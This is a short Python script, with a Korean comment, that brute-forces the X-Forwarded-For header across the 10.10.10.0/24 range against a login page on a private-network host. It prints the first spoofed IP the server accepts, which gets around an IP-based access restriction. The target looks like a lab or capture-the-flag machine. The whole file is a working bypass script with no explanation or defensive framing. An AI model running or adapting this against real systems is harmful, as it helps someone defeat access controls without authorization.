import requests

url = "http://192.168.86.200/login.php"

for i in range(256):
    ip = f"10.10.10.{i}"
    headers = {"X-Forwarded-For": ip}
    response = requests.get(url=url, headers=headers)

    # 에러 메시지가 포함되어 있는지 확인
    if "not allowed" not in response.text:
        print(f"[+] Found working IP: {ip}")
        print(response.text)
        break
    else:
        print(f"[-] Blocked: {ip}", end="\r")
